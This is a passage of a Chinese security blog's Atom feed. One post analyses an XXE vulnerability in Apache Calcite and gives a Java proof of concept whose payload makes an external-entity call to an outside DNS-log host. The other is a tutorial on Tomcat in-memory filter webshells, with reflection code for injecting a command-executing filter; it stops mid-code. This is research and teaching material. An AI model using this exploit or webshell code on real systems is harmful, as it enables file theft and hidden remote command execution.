<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mengd@</title>
  
  
  <link href="https://men9da.cn/atom.xml" rel="self"/>
  
  <link href="https://men9da.cn/"/>
  <updated>2022-10-25T14:37:18.771Z</updated>
  <id>https://men9da.cn/</id>
  
  <author>
    <name>Mengd@</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2022-39135(Apache calcite XXE)分析</title>
    <link href="https://men9da.cn/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/</id>
    <published>2022-10-25T13:55:39.000Z</published>
    <updated>2022-10-25T14:37:18.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-39135-Apache-calcite-xxe-分析"><a href="#CVE-2022-39135-Apache-calcite-xxe-分析" class="headerlink" title="CVE-2022-39135(Apache calcite xxe)分析"></a>CVE-2022-39135(Apache calcite xxe)分析</h1><p>漏洞影响版本:&lt;1.32.0的所有版本</p><h2 id="0X01-Apache-calcite"><a href="#0X01-Apache-calcite" class="headerlink" title="0X01:Apache calcite"></a>0X01:Apache calcite</h2><p>Apachecacite是一个动态数据库管理框架,它自身是包含一套符合行业标准的sql解析与验证器,既然支持解析sql语句,那么就有可能存在内建函数缺陷(例如mysql低版本的load_file函数可以写入任意文件,在高版本中便默认不支持)</p><h2 id="0X02-起因"><a href="#0X02-起因" class="headerlink" title="0X02:起因"></a>0X02:起因</h2><p>这个CVE是因为Apache calcite中的EXISTSNODE、EXTRACTXML、XMLTRANSFORM、 EXTRACTVALUE函数支持解析xml,并且在解析xml时默认支持解析外部实体引用从而导致XXE</p><h2 id="0X03-分析"><a href="#0X03-分析" class="headerlink" title="0X03:分析"></a>0X03:分析</h2><p>查阅官方文档,对其有如下解释</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025220648503.png" class title="image-20221025220648503"><p>机翻了一下:</p><p>方言特定运算符永久链接</p><p>以下运算符不在SQL标准中，并且未在Calcite的默认运算符表中启用。只有当会话启用了额外的运算符表时，它们才可用于查询。</p><p>要启用运算符表，请设置fun connect字符串参数。</p><p>“C”（兼容性）列包含值：</p><p>“b”表示Google BigQuery（连接字符串中的“fun=BigQuery”），</p><p>“h”表示Apache Hive（连接字符串中的“fun=Hive”），</p><p>“m”表示MySQL（连接字符串中的“fun=MySQL”），</p><p>“o”表示Oracle（连接字符串中的“fun=Oracle”），</p><p>‘p’表示PostgreSQL（连接字符串中的’fun=PostgreSQL’），</p><p>“s”表示Apache Spark（连接字符串中的“fun=Spark”）。</p><p>一个运算符名称可能对应于多个SQL方言，但语义不同。</p><p>大概的意思是,Apache calcite支持SQL方言,并且有b,h,m,o,p,s多种数据库模式,只用设置对应的键值对就能启动对应的方言,那我们漏洞涉及到的方法是哪一种方言呢？这里我们挑选其中一个EXTRACTVALUE来进行验证</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025221109302.png" class title="image-20221025221109302"><p>可以看到该方法的作用是解析xml并且返回第一个文本节点的文本,该方法对应的是m，也就是mysql,要启用对这个方法的支持需要设置fun的值为mysql,如何设置该值呢?</p><p>我们通过setProperty的方法设置对应的键值对并且将其注册到calcite链接中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Properties info = <span class="keyword">new</span> Properties();</span><br><span class="line">info.setProperty(<span class="string">&quot;fun&quot;</span>,<span class="string">&quot;mysql&quot;</span>);<span class="comment">//开启支持mysql方言,为了支持EXTRACTVALUE函数</span></span><br><span class="line">Connection connection = DriverManager.getConnection(<span class="string">&quot;jdbc:calcite:&quot;</span>, info);<span class="comment">//建立calcite链接对象</span></span><br><span class="line">CalciteConnection calciteConnection = connection.unwrap(CalciteConnection.class);</span><br><span class="line">Statement statement = calciteConnection.createStatement();</span><br><span class="line">ResultSet resultSet = statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><p>完整payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.calcite.jdbc.CalciteConnection;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String payload =<span class="string">&quot;&lt;!DOCTYPE document [ &lt;!ENTITY entity SYSTEM \&quot;http://0b8e40cf.toxiclog.xyz\&quot;&gt; ]&gt;&lt;document&gt;&amp;entity;&lt;/document&gt;&quot;</span>;</span><br><span class="line">        String sql = String.format(<span class="string">&quot;SELECT EXTRACTVALUE(&#x27;%s&#x27;,&#x27;/document&#x27;) AS ENTITY&quot;</span>,payload);</span><br><span class="line">        Properties info = <span class="keyword">new</span> Properties();</span><br><span class="line">        info.setProperty(<span class="string">&quot;fun&quot;</span>,<span class="string">&quot;mysql&quot;</span>);<span class="comment">//开启mysql方言支持</span></span><br><span class="line">        Connection connection = DriverManager.getConnection(<span class="string">&quot;jdbc:calcite:&quot;</span>, info);</span><br><span class="line">        CalciteConnection calciteConnection = connection.unwrap(CalciteConnection.class);</span><br><span class="line">        Statement statement = calciteConnection.createStatement();</span><br><span class="line">        ResultSet resultSet = statement.executeQuery(sql);</span><br><span class="line">        resultSet.next();<span class="comment">//触发解析</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在查询获得resultSet后调用next方法时触发xml解析</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025221731579.png" class title="image-20221025221731579"><p>跟进evaluate,在290行处直接newDocumentBuilder然后直接在291行处调用parse,没有设置关闭外部实体加载</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025221941439.png" class title="image-20221025221941439"><p>触发dns解析</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025222504699.png" class title="image-20221025222504699"><p>读取到任意文件</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025222556971.png" class title="image-20221025222556971"><h2 id="0X05-官方修复"><a href="#0X05-官方修复" class="headerlink" title="0X05:官方修复"></a>0X05:官方修复</h2><p>此处的input就是我们的xml字符串,原来直接将input带入evalute中,而1.32.0版本中input经过了getDocumentNode进行处理</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025222754546.png" class title="image-20221025222754546"><p>getDocumentNode中去new了DocumentBuilder</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025223537243.png" class title="image-20221025223537243"><p>并且DOCUMENT_BUILDER_FACTORY.get()中已经设置了禁止加载外部实体</p><img src="/2022/10/25/CVE-2022-39135-Apache-calcite-XXE-%E5%88%86%E6%9E%90/image-20221025223640208.png" class title="image-20221025223640208"><p>进而漏洞就无法触发了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2022-39135-Apache-calcite-xxe-分析&quot;&gt;&lt;a href=&quot;#CVE-2022-39135-Apache-calcite-xxe-分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2022-39135(Apach</summary>
      
    
    
    
    
    <category term="-java安全" scheme="https://men9da.cn/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java关于内存马的那些事</title>
    <link href="https://men9da.cn/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>https://men9da.cn/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2022-10-15T01:52:30.000Z</published>
    <updated>2022-10-27T02:05:57.228Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h3><p>关于java内存马有关的知识网络上有不少的分析文章,但是个人在学习的过程中觉得分析的不够详尽细致,作为第一次研究的读者可能有部分疑惑没有被解决,正好最近也在学习这方面的知识,故有了此文章</p><h3 id="0X02-Tomcat-Filter执行顺序"><a href="#0X02-Tomcat-Filter执行顺序" class="headerlink" title="0X02:Tomcat,Filter执行顺序"></a>0X02:Tomcat,Filter执行顺序</h3><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>相信大家在看到这篇文章之前已经看过其他相关分析文章了,已经知道tomcat内存马有Filter型，servlet型等,至于如何搭建servlet,如何实现filter等基本环境搭建,本文不再赘述,其余文章都有很好的手把手教学,本文详解Filter型内存马</p><p>servlet搭建:</p><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a></p><h5 id="TomcatFiltet执行流程"><a href="#TomcatFiltet执行流程" class="headerlink" title="TomcatFiltet执行流程"></a>TomcatFiltet执行流程</h5><p>相信大家对这样一张图非常熟悉</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015100043266.png" class title="image-20221015100043266"><p>接下来我们就来深入了解下这个图,需要解决以下两个问题:</p><p><strong>1.filter1,filter2的顺序是如何决定的</strong></p><p><strong>2.filter1,filter2…..的过滤链在代码中是如何体现的</strong></p><p><strong>3.filter1,filter2……是如何回来的,从图中看同一个filter经历了两次(请求一次,响应一次)他们执行了两次过滤吗?</strong></p><p>下面是两个filter的代码</p><p>Filter1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;one&quot;,value = &quot;/filter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;第一个filter被调用&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter结束&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>filter2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;two&quot;,value = &quot;/filter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeconedFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;第二个filter被调用&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>部署项目,我们访问/filter可以看到控制台有如下输出</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015101109972.png" class title="image-20221015101109972"><p><strong>第一个疑问，filter1,filter2的顺序是如何决定的</strong></p><p>FilterDemo和SeconedFilter这两个filter是谁先被调用的?凭什么SeconedFilter就是第二个调用的,难道是因为他的名字就叫SeconedFilter嘛！？,还真是！本文样例代码使用的是注解方式来定义filter的,按照类名的方式排序,F在S的前面,所以FilterDemo先调用,这一点idea按照文件名排序也能看出filter的优先级</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015101319527.png" class title="image-20221015101319527"><p><strong>第二个疑问，filter1,filter2…..的过滤链在代码中是如何体现的</strong></p><p>既然已经知道了调用链顺序,那我们从FilterDemo的doFilter下断点,看一下他是如何调用到SeconedFilter的dofilter方法的</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015101601919.png" class title="image-20221015101601919"><p>刚到filterChain,可以看到这个FilterChain中已经注册好了我们的三个filter(索引就体现了顺序),而我们的内存马的原理就是要修改filterChain的内容，这属于filterChain生成之前的分析,等等会讲到,现在我们分析的是filterchain的一个调用顺序,现在已经拿到之前生成好的filterChain了</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015101751997.png" class title="image-20221015101751997"><p>跟进首先会检查一个全局变量,这里是false</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102036206.png" class title="image-20221015102036206"><p>直接跳转到else调用internalDoFilter</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102109234.png" class title="image-20221015102109234"><p>跟进,此处n便是我们filter的个数,这里是3是因为有一个filter是tomcat自带的filter,此处的功能就是遍历所有的filter对象依次调用他们的doFilter方法</p><p>为什么这里的pos一来就是1呢?是因为我们是从第一个filter的dofilter下的断点,也就是说第一个filter的doFilter已经被执行过了,所以此处是1,接下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterConfig filterConfig &#x3D; filters[pos++];</span><br></pre></td></tr></table></figure><p>直接获取第二个filter也就是SeconedFilter,然后pos值增加为2</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102126672.png" class title="image-20221015102126672"><p>可以看见此处正是我们的第二个filter</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102437684.png" class title="image-20221015102437684"><p>继续往下执行filter.dofilter,执行第二个filter的doFilter方法,就能进入SeconedFilter的Dofilter方法了</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102533228.png" class title="image-20221015102533228"><p>可以看到直接进入了第二个Filter的doFilter方法</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102622765.png" class title="image-20221015102622765"><p>我们接着跟进filterChain.doFilte,还是跟之前一样,Globals.IS_SECURITY_ENABLED为False,直接进</p><p>internalDoFilter</p><p>到了刚刚熟悉的地方,此处pos等于2,马上获取最后一个filter,也就是tomcat自带的filter</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102732776.png" class title="image-20221015102732776"><p>可以看到此处为Tomcat的Filter</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102809447.png" class title="image-20221015102809447"><p>然后继续调用Tomcat自带的Filter的doFilter方法</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015102858419.png" class title="image-20221015102858419"><p>然后进入tomcat自带的Filter的DoFilter方法，和之前一样的，Globals.IS_SECURITY_ENABLED为Flase,进internalDoFilter</p><p>又来到此处,但是此时pos已经=3了(所有的Filter都遍历完了),不满足if条件,进else</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015103032891.png" class title="image-20221015103032891"><p>然后经过一系列的if，但是都是false，最后进到else中</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015103205216.png" class title="image-20221015103205216"><p>可以看到在Filter的最后会调用servlet.service</p><p><strong>第三个疑问:filter1,filter2……是如何回来的,从图中看同一个filter经历了两次(请求一次,响应一次)他们执行了两次过滤吗?</strong></p><p>刚刚的servlet.serice继续往下,会到此处,然后开始return</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015103624945.png" class title="image-20221015103624945"><p>整个链式调用会按照进入filter的顺序一个个return回来</p><p>首先会return到filter2</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015103808575.png" class title="image-20221015103808575"><p>接着return到filter1</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015103834048.png" class title="image-20221015103834048"><p>注意,此处说的return是指倒序return到每个Filter的filterChain.doFilter方法,并且每个return都会往后执行完毕后在return下一个,可以看到我注释的代码,也就是说过滤器逻辑可以将过滤响应的逻辑写在filterChain.doFilter的后面，去掉注释,触发filter,可以观察到整个进出filter的顺序</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221015104138875.png" class title="image-20221015104138875"><h3 id="0X03-Filter被执行前是什么样子的"><a href="#0X03-Filter被执行前是什么样子的" class="headerlink" title="0X03:Filter被执行前是什么样子的"></a>0X03:Filter被执行前是什么样子的</h3><p>关注Filter被执行前是什么样子的,核心就是在于我们如果能通过反射的手段去更改这个Filter被执行前的”样子”,增加一个虚空filter,并且注入其对应逻辑,那么不就创建了一个可以执行命令的filter(内存马)了了么,它只存在于本次tomcat生命周期中,不会在代码中落地。</p><p>我们关注到org.apache.catalina.core.ApplicationFilterFactory中的createFilterChain函数,这个里面便包含了我们所涉及到的所有重点参数：filterMaps，filterDefs，filterConfigs</p><p>可以看到这个调用栈是这样的,前面有一大堆invoke,有些文章跟了这一部分,但是个人认为对学习内存马没有什么用,,理解内存马并不需要理解前面的调用,直接看到在StandardWapperValue处在这个地方调用了我们createFilterChain</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221026170436421.png" class title="image-20221026170436421"><p>在createFilterChain方法获取了StandardContext,其中就包含和我们注入内存马有关的三个关键参数</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221026172618429.png" class title="image-20221026172618429"><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221026172637586.png" class title="image-20221026172637586"><p><strong>filterMaps</strong></p><p>filterMaps:这个里面保存了对应的url与不同filter的映射关系</p><p>它的结构是这样的一个map</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221026170927033.png" class title="image-20221026170927033"><p><strong>filterDefs</strong></p><p>filterDefs:包含了对应filter名称所对应的FilterDef对象,FilterDef对象则是存储了filter名称以及filter所对应的类等信息</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221026172855575.png" class title="image-20221026172855575"><p><strong>filterConfigs</strong></p><p>filterConfigs:包含了对应filter名称与其ApplicationFilterConfig对象的映射关系,ApplicationFilterConfig中存储的内容和FilterDef类似,也是filter名称以及对应的类,描述等信息</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221027091902013.png" class title="image-20221027091902013"><h3 id="0X05-注入恶意Filter"><a href="#0X05-注入恶意Filter" class="headerlink" title="0X05:注入恶意Filter"></a>0X05:注入恶意Filter</h3><p>我们新建一个filter,/create_eval_filter,我们访问这个filter就能注入内存马,使其在任意filter下传递cmd参数都可以执行命令</p><p>刚刚说到了我们的filterMaps，filterDefs，filterConfigs是决定一个filterChain内容和核心,他们都保存在servletContext的standardContext中,所以我们首先要获取的是standardContext,通过standardContext就可以得到filterMaps，filterDefs，filterConfigs</p><p><strong>获取servletContext的standardContext</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = servletRequest.getServletContext();</span><br><span class="line">Field appctx = <span class="keyword">null</span>;            </span><br><span class="line">appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//通过反射获取servletContext的context属性</span></span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);<span class="comment">//设置其可可修改性</span></span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext)appctx.get(servletContext);<span class="comment">//获取applicationContext</span></span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取applicationContext的context属性</span></span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);<span class="comment">//设置其可修改性</span></span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<span class="comment">//获取到standardContext</span></span><br></pre></td></tr></table></figure><p><strong>通过standardContext修改filterConfigs,filterDefs和filterMaps</strong></p><p>拿到standardContext,首先我们来修改filterConfigs，前面也提到了,filterConfigs的内容是对应filter名称与其ApplicationFilterConfig对象的映射关系,ApplicationFilterConfig中存储的内容和FilterDef类似,也是filter名称以及对应的类,描述等信息，<strong>所以修改filterConfigs就需要同步修改filterDefs</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);<span class="comment">//获取filterConfigs</span></span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);<span class="comment">//设置可修改</span></span><br><span class="line">Map filterConfigs = <span class="keyword">null</span>;</span><br><span class="line">filterConfigs = (Map) Configs.get(standardContext);<span class="comment">//获取filterConfigs的standardContext</span></span><br><span class="line">String FilterName = <span class="string">&quot;cmd_Filter&quot;</span>;<span class="comment">//定义filtername</span></span><br><span class="line">Filter filter = <span class="keyword">new</span> Filter() &#123;<span class="comment">//NEW一个Filter对象</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    